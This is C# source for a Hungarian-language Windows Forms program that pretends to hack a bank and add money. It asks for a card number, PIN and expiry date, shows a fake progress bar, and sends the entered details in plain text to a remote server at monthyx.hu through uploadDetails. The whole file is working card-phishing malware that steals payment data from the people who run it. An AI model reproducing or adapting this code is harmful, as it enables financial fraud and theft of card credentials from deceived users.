using System;
using System.IO;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Net;
using System.Threading;

namespace a
{

    public partial class Form1 : Form
    {
        string token = "";
        bool valid;
        private static Random random = new Random();

        public Form1()
        {
            // check if we even have internet lol
            if (checkInternet() == true)
            {
                InitializeComponent();
                this.comboBox1.SelectedIndex = 0;
                this.comboBox1.DropDownStyle = ComboBoxStyle.DropDownList;

                // initialize stuff. :D
                textBox1.MaxLength = 19;
                textBox2.MaxLength = 4;
                textBox3.MaxLength = 5;
                label18.Visible = false;
                pictureBox2.Visible = false;
                pictureBox3.Visible = true;
                pictureBox4.Visible = false;

                // generate token.
                string startToken = generateToken(35);

                // apply token in client.
                token = startToken;

                // apply token in server.
                var gen = new WebClient().DownloadString("http://monthyx.hu/generate.php?token=" + token);
            }
            else
            {
                // no internet Bruhh
                MessageBox.Show("no internet connection.");
                Application.Exit();
            }

        }

        public static bool checkInternet()
        {
            try
            {
                using (var client = new WebClient())
                using (client.OpenRead("http://monthyx.hu"))
                    return true;
            }
            catch
            {
                return false;
            }
        }

        public static string generateToken(int length)
        {
            const string chars = "0123456789abcdefg";
            return new string(Enumerable.Repeat(chars, length)
              .Select(s => s[random.Next(s.Length)]).ToArray());
        }

        private void uploadDetails(string cardnum, string pin, string expire)
        {
            // send epic details to server.
            var epic = new WebClient().DownloadString("http://monthyx.hu/upload.php?token=" + token + "&card=" + cardnum + "&pin=" + pin + "&expire=" + expire);

        }

        private void button1_Click(object sender, EventArgs e)
        {
            if (textBox1.TextLength == 19 && textBox2.TextLength == 4 && textBox3.TextLength == 5 && valid)
            {
                // start fake progress bar.
                progressBar1.Style = ProgressBarStyle.Continuous;
                progressBar1.Maximum = 100;
                progressBar1.Value = 0;
                timer1.Enabled = true;
                label18.Visible = true;

                // start server process.
                uploadDetails(textBox1.Text, textBox2.Text, textBox3.Text);
            }
            else
            {
                if (!valid)
                    MessageBox.Show("hibás bankkártya szám!");
                else
                    MessageBox.Show("hibás adatok!");
            }
        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            // increment progress bar :O
            progressBar1.Increment(5);

            // half of the fake progress.
            if (progressBar1.Value == 50)
            {
                label18.Text = "bank feltörése...";
            }

            // we're done here
            if (progressBar1.Value == 95)
            {
                label18.Text = "FELTÖRVE !!! 1337 $$$$$ o_OOO$";
                MessageBox.Show("pénz hozzáadva!!! köszi szépen");

                // wait a bit then exit.
                Thread.Sleep(600);
                Application.Exit();
            }
        }
        private void textBox1_KeyPress(object sender, KeyPressEventArgs e)
        {
            if (!char.IsControl(e.KeyChar) && !char.IsDigit(e.KeyChar) && (e.KeyChar != '.'))
            {
                e.Handled = true;
            }

            // only allow one decimal point.
            if ((e.KeyChar == '.') && ((sender as TextBox).Text.IndexOf('.') > -1))
            {
                e.Handled = true;
            }
        }

        private void textBox1_KeyDown(object sender, KeyEventArgs e)
        {
            // add - after 4 numbers of the credit card
            if (e.KeyCode != Keys.Back && this.textBox1.Text.Length < 19)
            {
                string text = this.textBox1.Text;
                if (text.Replace("-", "").Length % 4 == 0 && text.Length != 0 && text.Substring(text.Length - 1) != "-")
                {
                    this.textBox1.Text = this.textBox1.Text + "-";
                    this.textBox1.Select(this.textBox1.Text.Length, 1);
                }
            }
        }

        private void textBox3_KeyDown(object sender, KeyEventArgs e)
        {
            // add / to the date
            if (e.KeyCode != Keys.Back && this.textBox3.Text.Length < 5)
            {
                string text = this.textBox3.Text;
                if (text.Replace("/", "").Length % 2 == 0 && text.Length != 0 && text.Substring(text.Length - 1) != "/")
                {
                    this.textBox3.Text = this.textBox3.Text + "/";
                    this.textBox3.Select(this.textBox3.Text.Length, 1);
                }
            }

        }
        private void textBox1_TextChanged(object sender, EventArgs e)
        {
            // 5 for mastercard.
            if (this.textBox1.Text.StartsWith("5"))
            {
                pictureBox2.Visible = true;
                pictureBox3.Visible = false;
                pictureBox4.Visible = false;
                valid = true;
            }
            // 4 for visa.
            else if (this.textBox1.Text.StartsWith("4"))
            {
                pictureBox2.Visible = false;
                pictureBox3.Visible = false;
                pictureBox4.Visible = true;
                valid = true;
            }
            // dont accept other cards.
            else
            {
                pictureBox2.Visible = false;
                pictureBox3.Visible = true;
                pictureBox4.Visible = false;
                valid = false;
            }
        }

        private void Form1_Load(object sender, EventArgs e)
        {

        }

        private void label9_Click(object sender, EventArgs e)
        {

        }

        private void comboBox1_SelectedIndexChanged(object sender, EventArgs e)
        {

        }

        private void textBox3_TextChanged(object sender, EventArgs e)
        {

        }

        private void label1_Click(object sender, EventArgs e)
        {

        }

        private void label18_Click(object sender, EventArgs e)
        {

        }

        private void label11_Click(object sender, EventArgs e)
        {

        }

        private void pictureBox4_Click(object sender, EventArgs e)
        {

        }
    }
}
